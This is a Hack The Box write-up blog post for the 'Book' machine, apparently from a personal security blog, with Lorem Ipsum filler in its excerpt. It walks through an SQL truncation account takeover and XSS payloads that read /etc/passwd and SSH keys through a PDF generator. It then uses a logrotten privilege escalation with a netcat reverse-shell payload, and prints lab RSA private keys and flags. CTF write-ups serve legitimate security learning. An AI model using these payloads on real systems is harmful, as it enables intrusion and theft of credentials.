---
layout: single
title: Book - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-06-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-book/book_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-book/book_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/book# nmapAutomatorDirb.sh 10.10.10.176 All
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: LIBRARY - Read | Learn | Have Fun
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB:
    + http://10.10.10.176:80/books.php (CODE:302|SIZE:0)
    + http://10.10.10.176:80/contact.php (CODE:302|SIZE:0)
    + http://10.10.10.176:80/db.php (CODE:200|SIZE:0)
    + http://10.10.10.176:80/download.php (CODE:302|SIZE:0)
    + http://10.10.10.176:80/feedback.php (CODE:302|SIZE:0)
    + http://10.10.10.176:80/home.php (CODE:302|SIZE:0)
    + http://10.10.10.176:80/index.php (CODE:200|SIZE:6800)
    + http://10.10.10.176:80/logout.php (CODE:302|SIZE:0)
    + http://10.10.10.176:80/profile.php (CODE:302|SIZE:0)
    + http://10.10.10.176:80/search.php (CODE:302|SIZE:0)
    + http://10.10.10.176:80/settings.php (CODE:302|SIZE:0)
    + http://book.htb/admin/feedback.php (CODE:302|SIZE:0)
    + http://book.htb/admin/home.php (CODE:302|SIZE:0)
    + http://book.htb/admin/index.php (CODE:200|SIZE:6291)
    + http://book.htb/admin/messages.php (CODE:302|SIZE:0)
    + http://book.htb/admin/users.php (CODE:302|SIZE:0)

    NIKTO:
    + OSVDB-3092: /admin/: This might be interesting...
    + OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.


2. Browsing the webpage we find a login, where we are able to register an account. While logged in we can find some images,
   the administrator account name (under Contact) admin@book.htb, and nothing more really interesting.

   Visiting the admin-page (book.htb/admin) we are presented with a similar login page, however we don't have any valid credentials
   nor can we create an admin account.

   Looking back at the sign up form we are limited to a username length of 10 characters, and email length of 20 characters.
   20 characters is the default column length of a MySQL database, and strings that are longer will be truncated. This means that
   if we sign up with the email address 'admin@book.htb                    randomstring' which is 47 characters in total, the
   email will be truncated to 'admin@book.htb ' (with a trailing whitespace). Now the table will have two admin users;
   'admin@book.htb' and 'admin@book.htb '. By default, more relaxed comparison rules are used. One of these relaxations is that
   trailing space characters are ignored during the comparison. This means the string 'admin@book.htb ' is still equal to the string
   'admin@book.htb' in the database.

   With this in mind we can execute our SQL truncation attack via BurpSuite and/or cURL.

   root@p3:/opt/htb/machines/book# curl -v book.htb/index.php -H "Content-Type: application/x-www-form-urlencoded" --data "name=admin&email=admin%40book.htb                       randomstring&password=asdf"
    *   Trying 10.10.10.176:80...
    * TCP_NODELAY set
    * Connected to book.htb (10.10.10.176) port 80 (#0)
    > POST /index.php HTTP/1.1
    > Host: book.htb
    > User-Agent: curl/7.67.0
    > Accept: */*
    > Content-Type: application/x-www-form-urlencoded
    > Content-Length: 72
    >
    * upload completely sent off: 72 out of 72 bytes
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 302 Found
    < Date: Fri, 06 Mar 2020 08:14:31 GMT
    < Server: Apache/2.4.29 (Ubuntu)
    < Set-Cookie: PHPSESSID=3okm0p20tnpnf0m808nmg0fiku; path=/
    < Expires: Thu, 19 Nov 1981 08:52:00 GMT
    < Cache-Control: no-store, no-cache, must-revalidate
    < Pragma: no-cache
    < location: index.php
    < Content-Length: 0
    < Content-Type: text/html; charset=UTF-8
    <
    * Connection #0 to host book.htb left intact

  Now we are able to login on the admin-page with the credentials admin@book.htb:asdf


3. As the user, we can launch a LFI XSS attack, using the Book Submission feature. From the noob.ninja website we can just copy and
   paste the exact script and paste it into the 'Book Title'- and 'Author' fields.

   By retrieving /etc/passwd we can find the usernames, and from here hopefully grab a SSH private key.
    <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>

   When the suggestion has been made, head over to the admin-side of the site and download the new 'Collections PDF' which should now
   contain the content of /etc/passwd.

   In the PDF we find two users that are allowed to login, root and reader.
    root:x:0:0:root:/root:/bin/bash
    reader:x:1000:1000:reader:/home/reader:/bin/bash

   Do the same thing again and grab id_rsa from user reader.
    <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>


4. Unfortunately, due to formating we are unable to just copy the content of the pdf to create a usable id_rsa key. Convert it
   using pdf2txt.py, if you don't have it you can install if with 'pip3 install pdfminer.six'.

    root@nidus:/git/htb/book# pdf2txt.py key.pdf -o reader-id_rsa
    root@nidus:/git/htb/book# cat book-id_rsa
      -----BEGIN RSA PRIVATE KEY-----
      MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
      G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
      WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
      ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
      7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
      75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
      3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
      McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
      tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
      jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
      7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
      GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
      E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
      ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
      SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
      skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
      o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
      Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
      hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
      Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
      sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
      tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
      5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
      y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
      nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
      -----END RSA PRIVATE KEY-----

    There are still some formating error on the BEGIN and END part which we can edit manually.


5. Change the permission to reader-id_rsa and login to grab user.txt

    root@nidus:/git/htb/book# chmod 400 reader-id_rsa
    root@nidus:/git/htb/book# ssh reader@book.htb -i reader-id_rsa
    reader@book:~$ id
      uid=1000(reader) gid=1000(reader) groups=1000(reader)
    reader@book:~$ cat user.txt
      51c1d4b5197fa30e3e5d37f8778f95bc


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerating the box with linpeas and we find very sparse information. We are able to write to the local logfiles making
   a logrotate privesc possible, however for this to work logrotate must run as root. We can watch if this service is running using
   pspy64.

    reader@book:/dev/shm$ ./linpeas
      ..
       [+] Writable log files (logrotten)
       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
         Writable: /home/reader/backups/access.log.1
         Writable: /home/reader/backups/access.log

    reader@book:/dev/shm$ ./pspy64
      ..
      2020/06/07 09:18:59 CMD: UID=0    PID=39210  | /usr/sbin/logrotate -f /root/log.cfg
      2020/06/07 09:18:59 CMD: UID=0    PID=39209  | /bin/sh /root/log.sh

   As both criteria is true I googled for "logrotate privilege escalation" and found the logrotten github, containing the exact
   commands and scripts needed for this exploit.


2. Prepare for the exploit and grab all the files needed from github.

   Copy and paste logrotten.c into the victim machine and compile it.
    reader@book:/dev/shm$ gcc -o logrotten logrotten.c
    reader@book:/dev/shm$ chmod +x logrotten

   Copy and paste the payload to a file on the victim machine.
    reader@book:/dev/shm$ cat payloadfile
      if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash 10.10.14.2 4488 &); fi


3. Execute the exploit and be fast to grab what you need before the session expires (roughly 10 seconds)

    a) Start logrotten:
        reader@book:/dev/shm$ ./logrotten -p ./payloadfile /home/reader/backups/access.log
          Waiting for rotating /home/reader/backups/access.log...

    b) Start a listener:
        root@nidus:/opt/scanners/linux# nc -lvnp 4488
          listening on [any] 4488 ...

    c) Write something to access.log to start the logging process:
        reader@book:~/backups$ pwd
          /home/reader/backups
        reader@book:~/backups$ echo "a" > access.log

    d) Logrotten should now receive the rotation and execute your payload, giving you a shell. Note that it can take
       a few seconds before you get the shell, depending on the rotation. Once you get the shell you must act quick
       because the shell will die in about 10 seconds.

       NOTE: For me the exploit didn't work at first. But changing the order of my different SSH-sessions and all
             the programs made it work - so play around with that if you don't get any answer from logrotten.

        reader@book:/dev/shm$ ./logrotten -p ./payloadfile /home/reader/backups/access.log
          Waiting for rotating /home/reader/backups/access.log...
          Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
          Waiting 1 seconds before writing payload...
          Done!

        root@nidus:/opt/scanners/linux# nc -lvnp 4488
          listening on [any] 4488 ...
          connect to [10.10.14.2] from (UNKNOWN) [10.10.10.176] 43498
          #
          # id
            uid=0(root) gid=0(root) groups=0(root)
          # pwd
            /root
          # cat root.txt
            84da92adf998a1c7231297f70dd89714
          # cat /root/.ssh/id_rsa
            -----BEGIN RSA PRIVATE KEY-----
            MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCETrWcIdNU6J
            cFzQxCMM/E8UwLdD0fzUJtDgo4SUuwUmkPc6FXuLrZ+xqJaKoeu7/3WgjNBnRc7E
            z6kgpwnf4GOqpvxx1R1W+atbMkkWn6Ne89ogCUarJFVMEszzuC+14Id83wWSc8uV
            ZfwOR1y/Xqdu82HwoAMD3QG/gu6jER8V7zsC0ByAyTLT7VujBAP9USfqOeqza2UN
            GWUqIckZ2ITbChBuTeahfH2Oni7Z3q2wXzn/0yubA8BpyzVut4Xy6ZgjpH6tlwQG
            BEbULdw9d/E0ZFHN4MoNWuKtybx4iVMTBcZcyQIDAQABAoIBAQCgBcxwIEb2qSp7
            KQP2J0ZAPfFWmzzQum26b75eLA3HzasBJOGhlhwlElgY2qNlKJkc9nOrFrePAfdN
            PeXeYjXwWclL4MIAKjlFQPVg4v0Gs3GCKqMoEymMdUMlHoer2SPv0N4UBuldfXYM
            PhCpebtj7lMdDGUC60Ha0C4FpaiJLdbpfxHase/uHvp3S/x1oMyLwMOOSOoRZZ2B
            Ap+fnQEvGmp7QwfH+cJT8ggncyN+Gc17NwXrqvWhkIGnf7Bh+stJeE/sKsvG83Bi
            E5ugJKIIipGpZ6ubhmZZ/Wndl8Qcf80EbUYs4oIICWCMu2401dvPMXRp7PCQmAJB
            5FVQhEadAoGBAOQ2/nTQCOb2DaiFXCsZSr7NTJCSD2d3s1L6cZc95LThXLL6sWJq
            mljR6pC7g17HTTfoXXM2JN9+kz5zNms/eVvO1Ot9GPYWj6TmgWnJlWpT075U3CMU
            MNEzJtWyrUGbbRvm/2C8pvNSbLhmtdAg3pDsFb884OT8b4arufE7bdWHAoGBAMjo
            y0+3awaLj7ILGgvukDfpK4sMvYmx4QYK2L1R6pkGX2dxa4fs/uFx45Qk79AGc55R
            IV1OjFqDoq/s4jj1sChKF2+8+JUcrJMsk0WIMHNtDprI5ibYy7XfHe7oHnOUxCTS
            CPrfj2jYM/VCkLTQzdOeITDDIUGG4QGUML8IbM8vAoGBAM6apuSTzetiCF1vVlDC
            VfPEorMjOATgzhyqFJnqc5n5iFWUNXC2t8L/T47142mznsmleKyr8NfQnHbmEPcp
            ALJH3mTO3QE0zZhpAfIGiFk5SLG/24d6aPOLjnXai5Wgozemeb5XLAGOtlR+z8x7
            ZWLoCIwYDjXf/wt5fh3RQo8TAoGAJ9Da2gWDlFx8MdC5bLvuoOX41ynDNlKmQchM
            g9iEIad9qMZ1hQ6WxJ8JdwaK8DMXHrz9W7yBXD7SMwNDIf6u1o04b9CHgyWXneMr
            nJAM6hMm3c4KrpAwbu60w/AEeOt2o8VsOiusBB80zNpQS0VGRTYFZeCF6rKMTP/N
            WU6WIckCgYBE3k00nlMiBNPBn9ZC6legIgRTb/M+WuG7DVxiRltwMoDMVIoi1oXT
            ExVWHvmPJh6qYvA8WfvdPYhunyIstqHEPGn14fSl6xx3+eR3djjO6J7VFgypcQwB
            yiu6RurPM+vUkQKb1omS+VqPH+Q7FiO+qeywqxSBotnLvVAiaOywUQ==
            -----END RSA PRIVATE KEY-----
          # Hangup


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

SQL Truncation Attack:
  https://resources.infosecinstitute.com/sql-truncation-attack/

LFI XXS in Dynamic PDF:
  https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html

Logrotten:
  https://github.com/whotwagner/logrotten
